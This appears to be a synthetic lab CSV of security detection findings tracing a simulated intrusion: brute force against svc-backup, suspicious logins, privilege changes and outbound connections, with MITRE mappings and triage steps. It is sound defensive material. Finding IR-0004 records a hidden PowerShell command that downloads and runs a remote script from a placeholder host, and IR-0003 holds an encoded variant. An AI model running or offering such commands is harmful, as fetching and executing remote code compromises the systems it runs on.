finding_id,detection_name,severity,timestamp,user,host,source_ip,description,mitre_attack,indicators,evidence,false_positive_considerations,recommended_next_steps
IR-0001,Brute-force authentication attempts,Medium,2026-05-10T20:05:21+00:00,svc-backup,SRV-DC01,203.0.113.40,5 failed logons for user svc-backup from 203.0.113.40 within 10 minutes.,T1110 - Brute Force,user=svc-backup | source_ip=203.0.113.40 | event_id=4625,first_failure=2026-05-10T20:01:08+00:00 | last_failure=2026-05-10T20:05:21+00:00 | failure_count=5 | hosts=SRV-DC01,"Service account password rotation or expired credentials can create repeated failures. | Validate whether the source IP belongs to a known scanner, VPN, or admin jump host.",Review source IP reputation and ownership. | Check whether the targeted account had a recent password change. | Look for a successful login from the same source after the failures.
IR-0002,Successful login after repeated failures,High,2026-05-10T20:07:02+00:00,svc-backup,SRV-DC01,203.0.113.40,Successful login for svc-backup after 5 failed attempts from 203.0.113.40.,T1078 - Valid Accounts | T1110 - Brute Force,user=svc-backup | source_ip=203.0.113.40 | event_id_sequence=4625->4624,success_time=2026-05-10T20:07:02+00:00 | prior_failure_count=5 | first_failure=2026-05-10T20:01:08+00:00 | logon_type=Network,A legitimate user may mistype a password several times before succeeding. | Risk increases when the source IP is external or unusual for the account.,"Confirm whether the account owner performed the login. | Review MFA, VPN, and identity provider logs for the same time window. | Check endpoint and network activity immediately after the successful login."
IR-0003,Suspicious PowerShell execution,High,2026-05-10T20:08:30+00:00,svc-backup,SRV-DC01,,PowerShell command on SRV-DC01 used suspicious execution patterns commonly seen in script-based intrusion activity.,T1059.001 - PowerShell | T1027 - Obfuscated Files or Information,host=SRV-DC01 | user=svc-backup | process=powershell.exe | parent_process=cmd.exe,event_id=4688 | command_line=powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkA | sha256=7b3c2ef9d4bd9b33fc21675f933ad91ad31a92a0e132bd97d4be000000000000,"Administrators may use PowerShell with encoded commands for automation. | Compare parent process, user, and host role against known administrative workflows.","Decode encoded PowerShell content if present. | Collect process tree, script block logs, and related command history. | Check for network connections or file writes following this execution."
IR-0004,Suspicious PowerShell execution,High,2026-05-11T01:20:18+00:00,bob,WS-104,,PowerShell command on WS-104 used suspicious execution patterns commonly seen in script-based intrusion activity.,T1059.001 - PowerShell | T1027 - Obfuscated Files or Information,host=WS-104 | user=bob | process=powershell.exe | parent_process=explorer.exe,event_id=4688 | command_line=powershell.exe -WindowStyle Hidden IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1') | sha256=985ee6c50f7a7f473d7d1111111111111111111111111111111111111111111,"Administrators may use PowerShell with encoded commands for automation. | Compare parent process, user, and host role against known administrative workflows.","Decode encoded PowerShell content if present. | Collect process tree, script block logs, and related command history. | Check for network connections or file writes following this execution."
IR-0005,After-hours successful login,Medium,2026-05-10T18:55:10+00:00,alice,WS-101,10.10.5.20,Successful Interactive login outside the configured business window in Europe/Warsaw.,T1078 - Valid Accounts,user=alice | host=WS-101 | source_ip=10.10.5.20 | local_time=2026-05-10T20:55:10+02:00,event_id=4624 | utc_time=2026-05-10T18:55:10+00:00 | logon_type=Interactive | details=Normal workstation login,"On-call, maintenance, backup, and international user activity may be legitimate. | Validate the user's normal schedule and approved change windows.","Confirm whether the activity matches an approved work schedule. | Review geolocation, VPN, and MFA context for the source. | Correlate with endpoint process and network activity after login."
IR-0006,After-hours successful login,High,2026-05-10T20:07:02+00:00,svc-backup,SRV-DC01,203.0.113.40,Successful Network login outside the configured business window in Europe/Warsaw.,T1078 - Valid Accounts,user=svc-backup | host=SRV-DC01 | source_ip=203.0.113.40 | local_time=2026-05-10T22:07:02+02:00,event_id=4624 | utc_time=2026-05-10T20:07:02+00:00 | logon_type=Network | details=Successful login after failures,"On-call, maintenance, backup, and international user activity may be legitimate. | Validate the user's normal schedule and approved change windows.","Confirm whether the activity matches an approved work schedule. | Review geolocation, VPN, and MFA context for the source. | Correlate with endpoint process and network activity after login."
IR-0007,After-hours successful login,High,2026-05-11T01:16:42+00:00,bob,WS-104,198.51.100.23,Successful RemoteInteractive login outside the configured business window in Europe/Warsaw.,T1078 - Valid Accounts,user=bob | host=WS-104 | source_ip=198.51.100.23 | local_time=2026-05-11T03:16:42+02:00,event_id=4624 | utc_time=2026-05-11T01:16:42+00:00 | logon_type=RemoteInteractive | details=VPN remote desktop session,"On-call, maintenance, backup, and international user activity may be legitimate. | Validate the user's normal schedule and approved change windows.","Confirm whether the activity matches an approved work schedule. | Review geolocation, VPN, and MFA context for the source. | Correlate with endpoint process and network activity after login."
IR-0008,Privilege or account administration event,Medium,2026-05-10T20:07:09+00:00,svc-backup,SRV-DC01,203.0.113.40,Privilege-related Windows event 4672 observed for svc-backup on SRV-DC01.,T1098 - Account Manipulation,user=svc-backup | host=SRV-DC01 | event_id=4672 | privilege=SeDebugPrivilege;SeBackupPrivilege,time=2026-05-10T20:07:09+00:00 | event_type=privilege | details=Special privileges assigned to new logon,Domain administrators and service accounts may legitimately receive special privileges. | Group membership changes may be expected during onboarding or maintenance windows.,Verify change ticket or administrator approval. | Review group membership history for the affected account. | Check for suspicious activity before and after the privilege event.
IR-0009,Privilege or account administration event,High,2026-05-11T01:18:03+00:00,bob,SRV-DC01,198.51.100.23,Privilege-related Windows event 4728 observed for bob on SRV-DC01.,T1098 - Account Manipulation,user=bob | host=SRV-DC01 | event_id=4728 | privilege=Domain Admins,time=2026-05-11T01:18:03+00:00 | event_type=account_change | details=User added to privileged group,Domain administrators and service accounts may legitimately receive special privileges. | Group membership changes may be expected during onboarding or maintenance windows.,Verify change ticket or administrator approval. | Review group membership history for the affected account. | Check for suspicious activity before and after the privilege event.
IR-0010,Suspicious outbound network activity,High,2026-05-11T01:21:04+00:00,,WS-104,10.10.5.34,Outbound connection from WS-104 to 198.51.100.77:4444 categorized as unknown.,T1071 - Application Layer Protocol | T1105 - Ingress Tool Transfer,source_ip=10.10.5.34 | dest_ip=198.51.100.77 | dest_port=4444 | dns_query=,time=2026-05-11T01:21:04+00:00 | protocol=TCP | action=allow | bytes_out=145232 | category=unknown,"Unusual ports may be used by legitimate internal tools or development services. | Documentation IP ranges in this lab represent placeholders, not real bad infrastructure.","Identify the process responsible for the connection. | Check DNS, proxy, and endpoint telemetry around the same timestamp. | Block or monitor the destination if it is not business-approved."
IR-0011,Suspicious outbound network activity,Medium,2026-05-11T01:22:19+00:00,,WS-104,10.10.5.34,Outbound connection from WS-104 to 198.51.100.77:8080 categorized as unknown.,T1071 - Application Layer Protocol | T1105 - Ingress Tool Transfer,source_ip=10.10.5.34 | dest_ip=198.51.100.77 | dest_port=8080 | dns_query=cdn-cache.example,time=2026-05-11T01:22:19+00:00 | protocol=TCP | action=allow | bytes_out=84212 | category=unknown,"Unusual ports may be used by legitimate internal tools or development services. | Documentation IP ranges in this lab represent placeholders, not real bad infrastructure.","Identify the process responsible for the connection. | Check DNS, proxy, and endpoint telemetry around the same timestamp. | Block or monitor the destination if it is not business-approved."
